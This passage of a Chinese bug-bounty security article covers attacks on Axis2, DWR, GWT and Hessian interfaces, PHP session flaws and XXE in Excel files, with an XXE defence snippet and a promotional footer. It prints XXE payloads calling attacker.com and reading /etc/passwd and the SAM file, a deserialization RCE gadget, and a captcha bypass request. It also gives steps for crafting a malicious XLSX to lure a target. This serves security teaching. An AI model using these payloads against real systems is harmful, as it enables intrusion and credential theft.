204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">XFire</span></section></td><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">/servlet/XFireServlet</span></section></td><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">严重</span></section></td><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">反序列化、未授权</span></section></td></tr><tr style="color: rgb(53, 53, 53);background-attachment: scroll;background-clip: border-box;background-color: rgb(255, 255, 255);background-image: none;background-origin: padding-box;background-position-x: left;background-position-y: top;background-repeat: no-repeat;background-size: auto;width: auto;height: auto;"><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">CXF</span></section></td><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">/webservice/*</span></section></td><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">中高危</span></section></td><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">WSDL泄露、未授权</span></section></td></tr></tbody></table>  
  
**配置审计要点**  
：  
```
<!-- Axis2危险配置示例 -->
<servlet-mapping>
    <servlet-name>AxisServlet</servlet-name>
    <url-pattern>/services/*</url-pattern>
</servlet-mapping>

```  
#### 2.1.2 未授权访问漏洞  
  
Axis2服务列表未授权访问：  
```
http://target/services/

```  
  
**风险**  
：暴露所有可用服务接口，包含管理功能和敏感数据接口。  
#### 2.1.3 自身未修复漏洞  
  
**Axis2 XXE漏洞利用**  
：  
```
POST /services/TestService HTTP/1.1
Content-Type: text/xml

<!DOCTYPE root [  <!ENTITY % remote SYSTEM "http://attacker.com/xxe">  %remote;]>
<soap:Envelope>
  ...
</soap:Envelope>

```  
  
**SOAPMonitor反序列化**  
：  
1. 访问/SOAPMonitor  
查看配置  
  
1. 利用5001端口JMX服务  
  
1. 发送恶意序列化数据触发RCE  
  
### 2.2 DWR接口安全分析  
  
###   
#### 2.2.1 默认安全配置项  
  
危险配置示例：  
```
<init-param>
    <param-name>debug</param-name>
    <param-value>true</param-value> <!-- 高风险！ -->
</init-param>

```  
  
**风险接口**  
：  
```
/dwr/index.html
/dwr/test/xxx.dwr

```  
#### 2.2.2 未授权访问漏洞  
  
DWR接口调用协议分析：  
```
POST /dwr/call/plaincall/UserService.getUser.dwr HTTP/1.1
Content-Type: text/plain

callCount=1
nextReverseAjaxIndex=0
c0-scriptName=UserService
c0-methodName=getUser
c0-id=0
c0-param0=string:admin

```  
  
**攻击向量**  
：未授权调用任意Java方法，可能导致数据泄露或系统命令执行。  
#### 2.2.3 Debug状态下的问题  
  
当debug模式开启时，可直接通过浏览器控制台调用方法：  
```
// 控制台攻击示例
dwr.engine._execute('/dwr', 'UserService', 'deleteUser', 
    ['admin'], function(data){console.log(data)});

```  
### 2.3 GWT接口安全分析  
#### 2.3.1 未授权访问风险  
  
GWT接口识别特征：  
```
POST /app/rpc/UserService HTTP/1.1
X-GWT-Permutation: 4A3B2C1D
Content-Type: text/x-gwt-rpc

7|0|6|http://target/app/|...|getUser|1|admin|2|

```  
  
**攻击面**  
：  
1. 接口路径枚举：/rpc/UserService  
, /rpc/AdminService  
  
1. 方法名猜测：getUser  
, deleteUser  
, execCommand  
  
#### 2.3.2 自带绕WAF光环  
  
GWT协议特点：  
1. 二进制数据传输  
  
1. 自定义序列化格式  
  
1. 非标准参数编码  
  
**绕过原理**  
：传统WAF无法解析GWT专有协议格式，导致检测失效。  
### 2.4 HESSIAN接口安全分析  
#### 2.4.1 未授权访问风险  
  
Hessian协议识别：  
```
POST /UserService.hessian HTTP/1.1
Content-Type: application/x-hessian

```  
  
二进制数据流特征：  
```
C 02 00 6D 10 67 65 74 55 73 65 72 ...

```  
#### 2.4.2 自带绕WAF光环  
  
**绕过原理**  
：  
1. 二进制协议难以解析  
  
1. 非文本数据无法正则匹配  
  
1. 自定义序列化格式  
  
#### 2.4.3 自身未修复漏洞  
  
Hessian反序列化漏洞利用：  
```
// 恶意序列化对象构造
public class Exploit implements Serializable {
    private void readObject(ObjectInputStream in) {
        try {
            Runtime.getRuntime().exec("calc.exe");
        } catch (Exception e) {}
    }
}

```  
  
**攻击流程**  
：  
1. 生成恶意序列化数据  
  
1. 通过Hessian接口发送  
  
1. 触发目标服务器RCE  
  
## 第三部分：趣味的SESSION和EXCEL  
### 3.1 PHP中的SESSION污染  
#### 3.1.1 验证码逻辑漏洞  
  
典型漏洞代码：  
```
// 验证码生成
function generateCode() {
    $_SESSION['captcha'] = rand(1000,9999); 
    // 发送到用户手机
}

// 验证逻辑
if ($_POST['code'] == $_SESSION['captcha']) {
    // 验证通过
}

```  
  
**攻击手法**  
：  
1. 不请求验证码生成接口  
  
1. 直接提交空验证码：```
POST /reset-password.php HTTP/1.1

code=&username=admin

```  
  
  
1. 利用$_SESSION['captcha']  
未初始化，空值匹配空值  
  
#### 3.1.2 跨应用SESSION共享  
  
漏洞场景：  
```
应用A：http://demo.site.com
应用B：http://admin.site.com

```  
  
**攻击流程**  
：  
1. 访问应用A设置特权SESSION：```
// demo.site.com/set_session.php
$_SESSION['is_admin'] = true;

```  
  
  
1. 使用相同PHPSESSID访问应用B后台  
  
1. 绕过身份验证  
  
**技术原理**  
：默认配置下PHP使用相同SESSION存储目录，导致会话数据共享。  
### 3.2 XXE在EXCEL中的应用场景  
  
###   
#### 3.2.1 漏洞利用全流程  
  
**步骤1：解压XLSX文件**  
```
unzip document.xlsx -d exploit_dir

```  
  
**步骤2：注入XXE实体**  
```
<!-- exploit_dir/xl/workbook.xml -->
<!DOCTYPE root [  <!ENTITY % remote SYSTEM "http://attacker.com/xxe">  <!ENTITY % file SYSTEM "file:///etc/passwd">]>

```  
  
**步骤3：重打包文件**  
```
cd exploit_dir
zip -r ../malicious.xlsx *

```  
  
**步骤4：诱导目标打开文件**  
#### 3.2.2 高级利用技巧  
  
**绕过字符限制**  
：  
```
<!ENTITY % start "<![CDATA[">
<!ENTITY % end "]]>">
<!ENTITY % wrapper "%start;%file;%end;">

```  
  
**敏感文件读取**  
：  
```
<!ENTITY % file SYSTEM "file:///C:/Windows/system32/config/SAM">

```  
#### 3.2.3 漏洞防御方案  
  
**安全解析代码示例**  
：  
```
// 使用SAX解析器禁用外部实体
SAXParserFactory factory = SAXParserFactory.newInstance();
factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);

// 使用DocumentBuilderFactory
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);

```  
## 结语：攻防对抗的未来趋势  
### 技术演进方向  
1. **WAF绕过技术**  
：  
  
1. 基于AI的语法混淆  
  
1. 协议级隧道技术  
  
1. 分布式注入攻击  
  
1. **框架漏洞利用**  
：  
  
1. 云原生环境下的服务网格漏洞  
  
1. Serverless函数攻击面  
  
1. WASM环境逃逸技术  
  
1. **新型攻击场景**  
：  
  
1. 低代码平台漏洞链  
  
1. 浏览器API滥用  
  
1. 跨媒介攻击（文档→RCE）  
  
### 防御体系建议  
1. **纵深防御架构**  
：  
```
graph TD
A[边界WAF] --> B[API网关]
B --> C[应用沙箱]
C --> D[运行时保护]
D --> E[数据库防火墙]

```  
  
  
1. **关键防护措施**  
：  
  
1. 协议层：HTTP规范化处理  
  
1. 应用层：AST级代码分析  
  
1. 数据层：统一加密与脱敏  
  
1. 运维层：服务网格策略  
  
1. **持续检测机制**  
：  
  
1. 动态污点追踪  
  
1. 行为基线分析  
  
1. 异常语法检测  
  
在日益复杂的攻防对抗中，安全研究人员需要不断深化对底层技术的理解，掌握协议解析、框架机制和新型攻击面的知识体系。只有这样，才能在众测战场上持续突破，推动安全边界的不断扩展。  
  
  借鉴：  
  
  
《众测困住你的那些问题》  
  
jkgh006众测资深玩家，多家众测平台TOP白帽。  
  
  
  
【限时  
6  
折！华普安全研究星球：以  
原创实战  
为主+SRC/内网渗透核心资源库，助你在漏洞挖掘、SRC挖掘少走90%弯路】当90%的网络安全学习者还在重复刷题、泡论坛找零散资料时，华普安全研究星球已构建起完整的「攻防实战知识生态」：  
  
✅ 原创深度技术文档（独家SRC漏洞报告/代码审计报告）  
  
✅ 实战中使用到的工具分享  
  
✅ 全年更新SRC挖掘、代码审计报告（含最新0day验证思路）  
  
✅ 漏洞挖掘思维导图  
  
✅内部知识库目前建设中、后续进入圈子免费进入  
  
【  
实战为王  
】不同于传统课程的纸上谈兵！！  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_jpg/OMTnCvx3T1KhUT6lLRms0eic8scTIibJoGQBVaictTrzLs9G2yyia77mBTnW7m4Zx2OQfcbz5b5DbdrradsQNkpHNQ/640?wx_fmt=jpeg&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/OMTnCvx3T1KibZGSTtYYMVNzA35ZxXVRTxJibeicaQ0uttmutBuckibQFCEVicpyhhWXprQVOn4AnAnpDauQiaWTblMQ/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/OMTnCvx3T1KibZGSTtYYMVNzA35ZxXVRT9hvFFPpSupL0Q8d0Yv1F7dYxGZJjcKxHYTyiayhMI3xcVRoQhSs9VTQ/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/OMTnCvx3T1KibZGSTtYYMVNzA35ZxXVRTh0eO1DbG0onZph7o1AMPVU65ZjE5T9QH8XeMU0WNE5HiaUibNTBcQyyg/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/OMTnCvx3T1KibZGSTtYYMVNzA35ZxXVRTpXhxBicMHYsw8hotg4abR2gdaqYkfGPhX8EeNPcibAAs89qcOWl8Sqdw/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/OMTnCvx3T1KibZGSTtYYMVNzA35ZxXVRTJvsQnibaNk5WSuwpkDvkZTIFqN3XyKic4Mg5qI91sjNGQtibJRbEfIxgw/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/OMTnCvx3T1JJ8n2ibazrLMZicuXbFatE1eibEBguAHWUUo9DJiabXiauibCYNC7EGD83ia1ZwHe7ySnUqmgKuANrnvXpQ/640?wx_fmt=jpeg&from=appmsg "")  
  
  
  
  
  
**后期我们将持续发布原创代码审计、src等漏洞挖掘文章，后期有些源码、挖掘思路等也会放进圈子哈~**  
  
**有任何问题可后台留言**  
  
  
  
  
往期精选  
  
  
  
围观  
  
[PHP代码审计学习](http://mp.weixin.qq.com/s?__biz=Mzg5OTYxMjk0Mw==&mid=2247484594&idx=1&sn=89c96ed25e1f1d146fa3e67026ae0ca1&chksm=c051ecd2f72665c45d3e8c51b94629319b992f7f459d5677d7ce253eac99fc5e2e8f78684907&scene=21#wechat_redirect)  
  
  
丨更多  
  
热文  
  
[浅谈应急响应](http://mp.weixin.qq.com/s?__biz=Mzg5OTYxMjk0Mw==&mid=2247484589&idx=1&sn=80ff6dbb4471c101a71e203a10354d59&chksm=c051eccdf72665db0530fce6a332bf44392fb0c4d3d61496c9141bb93ece816cbbe97f89d06f&scene=21#wechat_redirect)  
  
  
丨更多  
  
·end·  
  
—如果喜欢，快分享给你的朋友们吧—  
  
我们一起愉快的玩耍吧  
  
  
  
【免责声明】  
  
"Rot5pider安全团队"作为专注于信息安全技术研究的自媒体平台，致力于传播网络安全领域的前沿知识与防御技术。本平台所载文章、工具及案例均用于合法合规的技术研讨与安全防护演练，严禁任何形式的非法入侵、数据窃取等危害网络安全的行为。所有技术文档仅代表作者研究过程中的技术观察，不构成实际操作建议，更不作为任何法律行为的背书。  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/OMTnCvx3T1K26bQox3P7WP9dbZ8fiaWVicDTm83Sic86kzBCzlXI5OiazEoc5ZrPHHWsRb80WlZcKRll5xOU2s5JKw/640?wx_fmt=gif&from=appmsg "")  
  
  
  
  
  
